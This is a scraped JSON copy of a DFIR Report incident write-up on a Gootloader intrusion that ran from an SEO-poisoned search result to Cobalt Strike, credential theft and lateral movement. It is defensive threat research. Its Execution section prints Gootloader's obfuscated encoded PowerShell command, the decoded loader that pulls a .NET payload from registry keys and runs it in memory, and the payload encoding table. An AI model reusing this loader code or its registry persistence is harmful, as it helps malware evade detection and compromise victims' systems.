{
    "id": "<report_0xa265b3d1>",
    "url": "https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story",
    "title": "SEO Poisoning A Gootloader Story",
    "meta": [],
    "chapters": [
        {
            "id": "<chapter_0xf3909941>",
            "title": "SEO Poisoning A Gootloader Story",
            "title_level": 1,
            "sentences": [
                {
                    "id": "<sentence_0x54ba78a5>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x69c3dc16>": "https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/"
                    },
                    "text": "May 9, 2022",
                    "html": "<a href=\"https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/\" rel=\"bookmark\">May 9, 2022</a>"
                },
                {
                    "id": "<sentence_0x6615931e>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "In early February 2022, we witnessed an intrusion employing Gootloader (aka GootKit) as the initial access vector.",
                    "html": "<p>In early February 2022, we witnessed an intrusion employing Gootloader (aka GootKit) as the initial access vector.</p>"
                },
                {
                    "id": "<sentence_0x3b44d110>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The intrusion lasted two days and comprised discovery, persistence, lateral movement, collection, defense evasion, credential access and command and control activity. During the post-exploitation phase, the threat actors used RDP, WMI, Mimikatz, Lazagne, WMIExec, and SharpHound. The threat actors then used this access to review sensitive documents.",
                    "html": "<p>The intrusion lasted two days and comprised discovery, persistence, lateral movement, collection, defense evasion, credential access and command and control activity. During the post-exploitation phase, the threat actors used RDP, WMI, Mimikatz, Lazagne, WMIExec, and SharpHound. The threat actors then used this access to review sensitive documents.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0x6ccfab23>",
            "title": "SEO Poisoning A Gootloader Story",
            "title_level": 1,
            "sentences": [
                {
                    "id": "<sentence_0x86cc2433>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xe3cd4261>": "https://thedfirreport.com/category/cobaltstrike/"
                    },
                    "text": "cobaltstrike",
                    "html": "<a class=\"category-color-6\" href=\"https://thedfirreport.com/category/cobaltstrike/\">cobaltstrike</a>"
                },
                {
                    "id": "<sentence_0xcf985819>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xee92fa09>": "https://thedfirreport.com/category/gootloader/"
                    },
                    "text": "gootloader",
                    "html": "<a class=\"category-color-94\" href=\"https://thedfirreport.com/category/gootloader/\">gootloader</a>"
                },
                {
                    "id": "<sentence_0x3145aa96>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xa76520ad>": "https://thedfirreport.com/category/lazagne/"
                    },
                    "text": "lazagne",
                    "html": "<a class=\"category-color-95\" href=\"https://thedfirreport.com/category/lazagne/\">lazagne</a>"
                },
                {
                    "id": "<sentence_0xb060b825>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x7107b5df>": "https://thedfirreport.com/category/psexec/"
                    },
                    "text": "psexec",
                    "html": "<a class=\"category-color-23\" href=\"https://thedfirreport.com/category/psexec/\">psexec</a>"
                }
            ]
        },
        {
            "id": "<chapter_0x7de7aafc>",
            "title": "Background",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0xd5a47ee>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xc8a542e1>": "https://news.sophos.com/en-us/2021/03/01/gootloader-expands-its-payload-delivery-options/"
                    },
                    "text": "Gootloader was the name assigned to the multi-staged payload distribution by Sophos in March 2021. The threat actors utilize SEO (search engine optimization) poisoning tactics to move compromised websites hosting malware to the top of certain search requests such as what is the difference between a grand agreement and a contract? or freddie mac shared driveway agreement?",
                    "html": "<p><a href=\"https://news.sophos.com/en-us/2021/03/01/gootloader-expands-its-payload-delivery-options/\" rel=\"noopener\" target=\"_blank\">Gootloader</a> was the name assigned to the multi-staged payload distribution by Sophos in March 2021. The threat actors utilize SEO (search engine optimization) poisoning tactics to move compromised websites hosting malware to the top of certain search requests such as \u201cwhat is the difference between a grand agreement and a contract?\u201d or \u201cfreddie mac shared driveway agreement?\u201d</p>"
                },
                {
                    "id": "<sentence_0x4684128a>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xc8a542e1>": "https://news.sophos.com/en-us/2021/03/01/gootloader-expands-its-payload-delivery-options/",
                        "<a_0xffacd998>": "https://www.sentinelone.com/labs/gootloader-initial-access-as-a-service-platform-expands-its-search-for-high-value-targets/",
                        "<a_0xa1b542c5>": "https://redcanary.com/threat-detection-report/threats/gootkit/"
                    },
                    "text": "When the user searches for these phrases and clicks on one of the top results, they are left with a forum looking web page where the user is instructed to download a file, which they accidently execute (double click to open). You can learn more about Gootloader by reading these references. 1 2 3",
                    "html": "<p>When the user searches for these phrases and clicks on one of the top results, they are left with a forum looking web page where the user is instructed to download a file, which they accidently execute (double click to open). You can learn more about Gootloader by reading these references. <a href=\"https://news.sophos.com/en-us/2021/03/01/gootloader-expands-its-payload-delivery-options/\" rel=\"noopener\" target=\"_blank\">1</a> <a href=\"https://www.sentinelone.com/labs/gootloader-initial-access-as-a-service-platform-expands-its-search-for-high-value-targets/\" rel=\"noopener\" target=\"_blank\">2</a> <a href=\"https://redcanary.com/threat-detection-report/threats/gootkit/\" rel=\"noopener\" target=\"_blank\">3</a></p>"
                },
                {
                    "id": "<sentence_0x38145b0b>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xd9ebc9ae>": "https://twitter.com/GootLoaderSites"
                    },
                    "text": "The researcher behind the @GootLoaderSites account is doing a great job of providing operational intelligence about the most recent malicious infrastructure. They also contact impacted businesses, monitor for newly created C2 addresses, and make the information public to the community. Thank you!",
                    "html": "<p>The researcher behind the <a href=\"https://twitter.com/GootLoaderSites\" rel=\"noopener\" target=\"_blank\">@GootLoaderSites</a> account is doing a great job of providing operational intelligence about the most recent malicious infrastructure. They also contact impacted businesses, monitor for newly created C2 addresses, and make the information public to the community. Thank you!</p>"
                },
                {
                    "id": "<sentence_0xfe1fe31>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<figure class=\"wp-block-image\"><a href=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-01.png\"><img alt=\"\" class=\"aligncenter size-full wp-image-6752 jetpack-lazy-image jetpack-lazy-image--handled\" height=\"359\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-01.png\" width=\"603\"/><img alt=\"\" class=\"aligncenter size-full wp-image-6752\" height=\"359\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-01.png\" width=\"603\"/></a></figure>"
                },
                {
                    "id": "<sentence_0x7ca8c0b7>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<p> </p>"
                }
            ]
        },
        {
            "id": "<chapter_0x4a806bad>",
            "title": "Case Summary",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0x83346757>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The intrusion started with a user searching Bing for Olymplus Plea Agreement?. The user then clicked on the second search result which led to the download and execution of a malicious javascript file (see video in Initial Access section). Upon execution, Gootloader utilized encoded PowerShell scripts to load Cobalt Strike into memory and persist on the host using a combination of registry keys and scheduled tasks.",
                    "html": "<p>The intrusion started with a user searching Bing for \u201cOlymplus Plea Agreement?\u201d. The user then clicked on the second search result which led to the download and execution of a malicious javascript file (see video in Initial Access section). Upon execution, Gootloader utilized encoded PowerShell scripts to load Cobalt Strike into memory and persist on the host using a combination of registry keys and scheduled tasks.</p>"
                },
                {
                    "id": "<sentence_0x82f8b407>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Fifteen minutes after the initial execution, we observed the threat actors using the PowerShell implementation of SharpHound (BloodHound) to discover attack paths in the Active Directory-based network. The threat actors collected the results and pivoted to another host via a Cobalt Strike PowerShell beacon.",
                    "html": "<p>Fifteen minutes after the initial execution, we observed the threat actors using the PowerShell implementation of SharpHound (BloodHound) to discover attack paths in the Active Directory-based network. The threat actors collected the results and pivoted to another host via a Cobalt Strike PowerShell beacon.</p>"
                },
                {
                    "id": "<sentence_0x909e6a17>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xa4f1078f>": "https://github.com/AlessandroZ/LaZagne"
                    },
                    "text": "After pivoting, they disabled Windows Defender, before executing a second Cobalt Strike payload for a different command and control server. Around an hour after the initial infection, the threat actors ran LaZagne to retrieve all saved credentials from the pivoted workstation. Meanwhile on the beachhead host, the threat actors ran Mimikatz via PowerShell to extract credentials.",
                    "html": "<p>After pivoting, they disabled Windows Defender, before executing a second Cobalt Strike payload for a different command and control server. Around an hour after the initial infection, the threat actors ran <a href=\"https://github.com/AlessandroZ/LaZagne\" rel=\"noopener\" target=\"_blank\">LaZagne</a> to retrieve all saved credentials from the pivoted workstation. Meanwhile on the beachhead host, the threat actors ran Mimikatz via PowerShell to extract credentials.</p>"
                },
                {
                    "id": "<sentence_0xa91e42ce>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "With those credentials, the threat actors used RDP from the beachhead host to the already compromised workstation host. They then targeted several other workstations with Cobalt Strike beacon executables; however, no further activity was observed on those endpoints other than the initial lateral movement.",
                    "html": "<p>With those credentials, the threat actors used RDP from the beachhead host to the already compromised workstation host. They then targeted several other workstations with Cobalt Strike beacon executables; however, no further activity was observed on those endpoints other than the initial lateral movement.</p>"
                },
                {
                    "id": "<sentence_0x2df2cc36>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The threat actors favored RDP and remote WMI as their preferred methods to interact with the hosts and servers of interest throughout the rest of the intrusion. After around a four-hour pause of inactivity, the threat actors enabled restricted admin mode via WMI on a domain controller and logged in using RDP.",
                    "html": "<p>The threat actors favored RDP and remote WMI as their preferred methods to interact with the hosts and servers of interest throughout the rest of the intrusion. After around a four-hour pause of inactivity, the threat actors enabled restricted admin mode via WMI on a domain controller and logged in using RDP.</p>"
                },
                {
                    "id": "<sentence_0x9f71d2de>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The threat actors then used Lazagne again on the domain controller to extract more credentials. Our evidence shows that the attackers then began looking for interesting documents on file shares. They opened the documents one-by-one on the remote host via RDP. They directed their focus to documents with legal and insurance-related content.",
                    "html": "<p>The threat actors then used Lazagne again on the domain controller to extract more credentials. Our evidence shows that the attackers then began looking for interesting documents on file shares. They opened the documents one-by-one on the remote host via RDP. They directed their focus to documents with legal and insurance-related content.</p>"
                },
                {
                    "id": "<sentence_0xdd70f95a>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "On the second and final day of the intrusion, the threat actors ran Advanced IP Scanner from the domain controller via the RDP session. Additionally, they inspected the file server and backup server, looking for more interesting data before leaving the network.",
                    "html": "<p>On the second and final day of the intrusion, the threat actors ran Advanced IP Scanner from the domain controller via the RDP session. Additionally, they inspected the file server and backup server, looking for more interesting data before leaving the network.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0xe66bd0a2>",
            "title": "Timeline",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0xacd5f84c>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0xbeb329c4>": "https://thedfirreport.com/wp-content/uploads/2022/05/SEO-Poisoning-A-Gootloader-Story.png"
                    },
                    "text": "",
                    "html": "<figure class=\"wp-block-image\"><img alt=\"\" class=\"size-full wp-image-6823 aligncenter jetpack-lazy-image\" height=\"3072\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/SEO-Poisoning-A-Gootloader-Story.png\" width=\"1498\"/><img alt=\"\" class=\"size-full wp-image-6823 aligncenter\" height=\"3072\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/SEO-Poisoning-A-Gootloader-Story.png\" width=\"1498\"/></figure>"
                },
                {
                    "id": "<sentence_0xeb518cd1>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x952664b8>": "https://twitter.com/Kostastsale",
                        "<a_0x380ea2cd>": "https://twitter.com/iiamaleks",
                        "<a_0x406b50ee>": "https://twitter.com/pigerlin"
                    },
                    "text": "Analysis and reporting completed by @kostastsale @iiamaleks @pigerlin",
                    "html": "<p>Analysis and reporting completed by <a href=\"https://twitter.com/Kostastsale\" rel=\"noreferrer noopener\" target=\"_blank\">@kostastsale</a> <a href=\"https://twitter.com/iiamaleks\" rel=\"noreferrer noopener\" target=\"_blank\">@iiamaleks</a> <a href=\"https://twitter.com/pigerlin\" rel=\"noreferrer noopener\" target=\"_blank\">@pigerlin</a></p>"
                }
            ]
        },
        {
            "id": "<chapter_0x611a6a1c>",
            "title": "Initial Access",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0xc390cd16>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The threat actor gained initial access using Gootloader malware. Heres a video of the user searching and downloading the malware via the poisoned SEO search.",
                    "html": "<p>The threat actor gained initial access using Gootloader malware. Here\u2019s a video of the user searching and downloading the malware via the poisoned SEO search.</p>"
                },
                {
                    "id": "<sentence_0x1841bd55>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<p></p>"
                },
                {
                    "id": "<sentence_0xb7d7b1d9>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<p></p>"
                },
                {
                    "id": "<sentence_0x7604da93>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The Javascript file is then executed when double clicked after the zip is opened.",
                    "html": "\nThe Javascript file is then executed when double clicked after the zip is opened.\n \n"
                },
                {
                    "id": "<sentence_0x68a19ae7>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<a href=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-03.png\"><img alt=\"\" class=\"aligncenter size-full wp-image-6754 jetpack-lazy-image\" height=\"104\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-03.png\" width=\"1856\"/><img alt=\"\" class=\"aligncenter size-full wp-image-6754\" height=\"104\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-03.png\" width=\"1856\"/></a>"
                }
            ]
        },
        {
            "id": "<chapter_0xddd6c30a>",
            "title": "Execution",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0xcb5d939a>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Gootloader upon execution creates two registry keys:",
                    "html": "\nGootloader upon execution creates two registry keys:\n \n"
                },
                {
                    "id": "<sentence_0xfc1791f1>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username0",
                    "html": "<ul>\n<li><code>HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username</code> <code>HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username0</code></li>\n</ul>"
                },
                {
                    "id": "<sentence_0x14e1ce46>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The first is populated with an encoded Cobalt Strike payload and the latter is used to store a .NET loader named powershell.dll.",
                    "html": "\nThe first is populated with an encoded Cobalt Strike payload and the latter is used to store a .NET loader named powershell.dll.\n \n"
                },
                {
                    "id": "<sentence_0xa3095971>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<a href=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-04.png\"><img alt=\"\" class=\"aligncenter size-full wp-image-6755 jetpack-lazy-image\" height=\"431\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-04.png\" width=\"1354\"/><img alt=\"\" class=\"aligncenter size-full wp-image-6755\" height=\"431\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-04.png\" width=\"1354\"/></a>"
                },
                {
                    "id": "<sentence_0x89572bc9>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<a href=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-05.png\"><img alt=\"\" class=\"aligncenter size-full wp-image-6756 jetpack-lazy-image\" height=\"419\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-05.png\" width=\"1419\"/><img alt=\"\" class=\"aligncenter size-full wp-image-6756\" height=\"419\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-05.png\" width=\"1419\"/></a>"
                },
                {
                    "id": "<sentence_0x9d5ee958>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Following the Registry events, a PowerShell command was launched executing an encoded command.",
                    "html": "\n \nFollowing the Registry events, a PowerShell command was launched executing an encoded command.\n \n"
                },
                {
                    "id": "<sentence_0xc043c4ce>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<a href=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-06.png\"><img alt=\"\" class=\"aligncenter size-full wp-image-6757 jetpack-lazy-image\" height=\"174\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-06.png\" width=\"1373\"/><img alt=\"\" class=\"aligncenter size-full wp-image-6757\" height=\"174\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-06.png\" width=\"1373\"/></a>"
                },
                {
                    "id": "<sentence_0xeb2631d2>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "\"powershell.exe\" /c C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe \"/\"e\" NgAxA\"DQANgA0ADkA\"MgAxADEAOwB\"zAGwAZQBlAHAAIAAtAHMAIAA4AD\"MA\"OwAkAG8AcABqAD0ARwBlAH\"QA\"LQBJAHQ\"AZQBtAFAA\"cg\"B\"vAHAAZQ\"ByA\"HQAeQ\"Ag\"AC0\"AcABh\"AH\"QAaAAg\"ACgAIg\"BoAGsA\"IgArACIAYwB1A\"Do\"AX\"ABz\"AG8\"AZgA\"iACsA\"IgB0AH\"c\"AIgAr\"ACIAY\"QB\"y\"AGUAXABtAGkAYwAiA\"CsAI\"gB\"yAG\"8AcwAiAC\"sA\"IgB\"v\"AG\"YAd\"ABc\"AFAAa\"AB\"vAG4AZQBcACIAKwBbAE\"UAbgB2\"AGkAc\"gBv\"AG4\"A\"bQBlAG4\"AdA\"B\"dADo\"AOgAo\"ACIAdQBzA\"GUAIgArAC\"IAcgBuACIAK\"wAiAGEAb\"QBlACIAKQArA\"C\"IAM\"AAi\"AC\"kAOwB\"mAG8AcgAg\"ACg\"A\"J\"AB1AG8APQAw\"ADs\"AJAB1AG8AIAA\"tAG\"wAZQAgADc\"A\"N\"gA\"wADsA\"JAB1AG8AK\"wArA\"CkAewBUAHIAeQ\"B7A\"CQA\"b\"QBwA\"GQAKw\"A9A\"CQA\"bwB\"wAGo\"ALgA\"kAHU\"AbwB9AEM\"AY\"QB\"0A\"GMAaAB7AH0AfQA7ACQAdQB\"vAD0A\"M\"AA7AHc\"AaAB\"pAGwAZQAo\"ACQAdAByAH\"U\"AZQApA\"H\"sAJAB1AG\"8AKwA\"r\"A\"DsAJABrAG8APQB\"bAG\"0AY\"QB0AGgAX\"QA6ADo\"AK\"AAi\"AH\"MAcQAiACs\"AIgByAHQAI\"g\"ApACgAJ\"AB1A\"G8\"AKQA\"7A\"GkA\"ZgAoACQA\"awBvACA\"ALQB\"lAHEAIAAxADAAM\"A\"AwACkAew\"B\"iAHIA\"Z\"Q\"Bh\"AGsAfQB9A\"CQAeQB\"sAD0AJABtAH\"A\"AZAAuAH\"IAZQBwA\"GwAY\"QB\"jA\"GU\"A\"KAA\"iACMAIgAsACQAawBv\"ACk\"AOwA\"kAGsAagB\"iAD\"0AWwB\"iA\"HkA\"dA\"Bl\"AFsA\"XQBdA\"DoAOgAo\"ACIAb\"gBlACIAKw\"AiA\"HcA\"IgApACgAJAB5AGwA\"L\"gBM\"AG\"UA\"bgBn\"A\"HQAaAAvADIAKQA7\"AGYAbwB\"yACg\"A\"JA\"B\"1A\"G8A\"P\"QAwADsAJAB1AG\"8\"AIAAt\"A\"G\"w\"A\"dAAgA\"CQA\"eQ\"B\"sAC4AT\"ABlAG4AZwB0AG\"gAOwAkAHUAb\"wArAD\"0A\"MgA\"pAH\"s\"AJABrAGoAY\"gBbACQ\"AdQBvAC8AMgBdAD0AWwBjAG8AbgB\"2\"AGUAcgB0A\"F\"0\"A\"OgA\"6\"ACgAIgBU\"AG8AQg\"AiACsA\"IgB5AHQAZ\"Q\"AiACkAKA\"AkAH\"kAbAAuA\"FM\"Ad\"QBiAHMA\"dAB\"yAGkAb\"gBnACgAJAB1AG8\"AL\"AAy\"A\"CkA\"LAAoADIAK\"gA4AC\"kAKQB9AFsA\"cg\"Bl\"AGYAb\"ABlAGM\"AdA\"BpAG8\"AbgAuAGEAcw\"BzAGUAbQBiA\"GwAeQBd\"ADo\"AOgAoAC\"IAT\"ABv\"AC\"IA\"K\"wAiAGEA\"Z\"AA\"i\"AC\"kAKA\"A\"kAGsAagB\"iACkAO\"wBbAE8AcA\"Bl\"AG4AXQA6\"A\"D\"oA\"KAAiAF\"QAZQAiA\"C\"sAIgBzA\"H\"Q\"AIgAp\"A\"Cg\"AKQA7ADYA\"MQA\"xAD\"gAOQA\"4ADUAN\"AA0AD\"sA<crlf>The PowerShell command will extract the .NET loader from",
                    "html": "\n\"powershell.exe\" /c C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe \"/\"e\" NgAxA\"DQANgA0ADkA\"MgAxADEAOwB\"zAGwAZQBlAHAAIAAtAHMAIAA4AD\"MA\"OwAkAG8AcABqAD0ARwBlAH\"QA\"LQBJAHQ\"AZQBtAFAA\"cg\"B\"vAHAAZQ\"ByA\"HQAeQ\"Ag\"AC0\"AcABh\"AH\"QAaAAg\"ACgAIg\"BoAGsA\"IgArACIAYwB1A\"Do\"AX\"ABz\"AG8\"AZgA\"iACsA\"IgB0AH\"c\"AIgAr\"ACIAY\"QB\"y\"AGUAXABtAGkAYwAiA\"CsAI\"gB\"yAG\"8AcwAiAC\"sA\"IgB\"v\"AG\"YAd\"ABc\"AFAAa\"AB\"vAG4AZQBcACIAKwBbAE\"UAbgB2\"AGkAc\"gBv\"AG4\"A\"bQBlAG4\"AdA\"B\"dADo\"AOgAo\"ACIAdQBzA\"GUAIgArAC\"IAcgBuACIAK\"wAiAGEAb\"QBlACIAKQArA\"C\"IAM\"AAi\"AC\"kAOwB\"mAG8AcgAg\"ACg\"A\"J\"AB1AG8APQAw\"ADs\"AJAB1AG8AIAA\"tAG\"wAZQAgADc\"A\"N\"gA\"wADsA\"JAB1AG8AK\"wArA\"CkAewBUAHIAeQ\"B7A\"CQA\"b\"QBwA\"GQAKw\"A9A\"CQA\"bwB\"wAGo\"ALgA\"kAHU\"AbwB9AEM\"AY\"QB\"0A\"GMAaAB7AH0AfQA7ACQAdQB\"vAD0A\"M\"AA7AHc\"AaAB\"pAGwAZQAo\"ACQAdAByAH\"U\"AZQApA\"H\"sAJAB1AG\"8AKwA\"r\"A\"DsAJABrAG8APQB\"bAG\"0AY\"QB0AGgAX\"QA6ADo\"AK\"AAi\"AH\"MAcQAiACs\"AIgByAHQAI\"g\"ApACgAJ\"AB1A\"G8\"AKQA\"7A\"GkA\"ZgAoACQA\"awBvACA\"ALQB\"lAHEAIAAxADAAM\"A\"AwACkAew\"B\"iAHIA\"Z\"Q\"Bh\"AGsAfQB9A\"CQAeQB\"sAD0AJABtAH\"A\"AZAAuAH\"IAZQBwA\"GwAY\"QB\"jA\"GU\"A\"KAA\"iACMAIgAsACQAawBv\"ACk\"AOwA\"kAGsAagB\"iAD\"0AWwB\"iA\"HkA\"dA\"Bl\"AFsA\"XQBdA\"DoAOgAo\"ACIAb\"gBlACIAKw\"AiA\"HcA\"IgApACgAJAB5AGwA\"L\"gBM\"AG\"UA\"bgBn\"A\"HQAaAAvADIAKQA7\"AGYAbwB\"yACg\"A\"JA\"B\"1A\"G8A\"P\"QAwADsAJAB1AG\"8\"AIAAt\"A\"G\"w\"A\"dAAgA\"CQA\"eQ\"B\"sAC4AT\"ABlAG4AZwB0AG\"gAOwAkAHUAb\"wArAD\"0A\"MgA\"pAH\"s\"AJABrAGoAY\"gBbACQ\"AdQBvAC8AMgBdAD0AWwBjAG8AbgB\"2\"AGUAcgB0A\"F\"0\"A\"OgA\"6\"ACgAIgBU\"AG8AQg\"AiACsA\"IgB5AHQAZ\"Q\"AiACkAKA\"AkAH\"kAbAAuA\"FM\"Ad\"QBiAHMA\"dAB\"yAGkAb\"gBnACgAJAB1AG8\"AL\"AAy\"A\"CkA\"LAAoADIAK\"gA4AC\"kAKQB9AFsA\"cg\"Bl\"AGYAb\"ABlAGM\"AdA\"BpAG8\"AbgAuAGEAcw\"BzAGUAbQBiA\"GwAeQBd\"ADo\"AOgAoAC\"IAT\"ABv\"AC\"IA\"K\"wAiAGEA\"Z\"AA\"i\"AC\"kAKA\"A\"kAGsAagB\"iACkAO\"wBbAE8AcA\"Bl\"AG4AXQA6\"A\"D\"oA\"KAAiAF\"QAZQAiA\"C\"sAIgBzA\"H\"Q\"AIgAp\"A\"Cg\"AKQA7ADYA\"MQA\"xAD\"gAOQA\"4ADUAN\"AA0AD\"sA\nThe PowerShell command will extract the .NET loader from "
                },
                {
                    "id": "<sentence_0xcd2da0f5>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<code_0x3042c228>": "HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username0"
                    },
                    "text": "",
                    "html": "<code>HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username0</code>"
                },
                {
                    "id": "<sentence_0xedb7c73c>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "and execute the code in memory via `Assembly.Load()`.<crlf><crlf>614649211; sleep -s 83; $opj=Get-ItemProperty -path (\"hkcu:\\software\\microsoft\\Phone\\\"+[Environment]::(\"username\")+\"0\"); for ($uo=0;$uo -le 760;$uo++) { Try{$mpd+=$opj.$uo}Catch{} }; $uo=0; while($true) { $uo++;$ko=[math]::(\"sqrt\")($uo); if($ko -eq 1000){break} } $yl=$mpd.replace(\"#\",$ko); $kjb=[byte[]]::(\"new\")($yl.Length/2); for($uo=0;$uo -lt $yl.Length;$uo+=2){ $kjb[$uo/2]=[convert]::(\"ToByte\")($yl.Substring($uo,2),(2*8)) } [reflection.assembly]::(\"Load\")($kjb); [Open]::(\"Test\")(); 6118985",
                    "html": " and execute the code in memory via `Assembly.Load()`.\n \n614649211; sleep -s 83; $opj=Get-ItemProperty -path (\"hkcu:\\software\\microsoft\\Phone\\\"+[Environment]::(\"username\")+\"0\"); for ($uo=0;$uo -le 760;$uo++) { Try{$mpd+=$opj.$uo}Catch{} }; $uo=0; while($true) { $uo++;$ko=[math]::(\"sqrt\")($uo); if($ko -eq 1000){break} } $yl=$mpd.replace(\"#\",$ko); $kjb=[byte[]]::(\"new\")($yl.Length/2); for($uo=0;$uo -lt $yl.Length;$uo+=2){ $kjb[$uo/2]=[convert]::(\"ToByte\")($yl.Substring($uo,2),(2*8)) } [reflection.assembly]::(\"Load\")($kjb); [Open]::(\"Test\")(); 6118985\n"
                },
                {
                    "id": "<sentence_0x6862e3a6>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x48be8898>": "https://github.com/The-DFIR-Report/cyberchef-recipes/blob/main/SEO%20Poisoning%20-%20A%20GootLoader%20Story"
                    },
                    "text": "This",
                    "html": "<a href=\"https://github.com/The-DFIR-Report/cyberchef-recipes/blob/main/SEO%20Poisoning%20-%20A%20GootLoader%20Story\" rel=\"noopener\" target=\"_blank\">This</a>"
                },
                {
                    "id": "<sentence_0x9826a7c5>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "CyberChef recipe can be used to decode the related PS encoded payload.<crlf><crlf>Once the PowerShell script is finished running, the next stage involves the .NET loader. The .NET loader will read",
                    "html": " CyberChef recipe can be used to decode the related PS encoded payload.\n \nOnce the PowerShell script is finished running, the next stage involves the .NET loader. The .NET loader will read "
                },
                {
                    "id": "<sentence_0x8412825>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<code_0xa316fd01>": "HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username"
                    },
                    "text": "",
                    "html": "<code>HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username</code>"
                },
                {
                    "id": "<sentence_0xfa721f51>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "and extract the encoded Cobalt Strike payload. This payload will be decoded and subsequently loaded into memory for execution.<crlf><crlf>A simple encoding scheme is used where a letter will correspond to one of the hex characters (0-F), or alternately three zeros.<crlf><crlf>q->000<crlf>v->0<crlf>w->1<crlf>r->2<crlf>t->3<crlf>y->4<crlf>u->5<crlf>i->6<crlf>o->7<crlf>p->8<crlf>s->9<crlf>q->A<crlf>h->B<crlf>j->C<crlf>k->D<crlf>l->E<crlf>z->F<crlf>The following shows the source code responsible for the core logic of the .NET loader.",
                    "html": " and extract the encoded Cobalt Strike payload. This payload will be decoded and subsequently loaded into memory for execution.\n \nA simple encoding scheme is used where a letter will correspond to one of the hex characters (0-F), or alternately three zeros.\n \nq->000\nv->0\nw->1\nr->2\nt->3\ny->4\nu->5\ni->6\no->7\np->8\ns->9\nq->A\nh->B\nj->C\nk->D\nl->E\nz->F\nThe following shows the source code responsible for the core logic of the .NET loader.\n \n"
                },
                {
                    "id": "<sentence_0xfd6a4c59>",
                    "is_empty": true,
                    "have_tags": false,
